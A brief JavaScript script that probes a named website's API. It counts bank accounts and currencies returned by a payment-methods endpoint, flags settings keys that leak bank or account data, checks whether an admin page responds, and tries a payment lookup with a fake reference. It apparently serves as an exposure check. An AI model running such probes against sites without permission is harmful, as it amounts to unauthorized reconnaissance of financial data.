const B = 'https://dmmotorgroup.com';
const a = await fetch(B + '/api/payment-methods/bank-accounts').then((r) => r.json());
console.log('bank accounts on file:', a.accounts.length, '| currencies supported:', a.currencies.length);
const h = await fetch(B + '/api/home').then((r) => r.json());
console.log('public settings leak (bank/account keys):', Object.keys(h.settings).filter((k) => /bank|account/i.test(k)).length);
console.log('pages -> home:', (await fetch(B + '/')).status, '| videos:', (await fetch(B + '/videos')).status, '| admin:', (await fetch(B + '/admin')).status);
console.log('lookup with a made-up reference:', (await fetch(B + '/api/payments/lookup?reference=DMG-20260101-FAKE1234')).status);
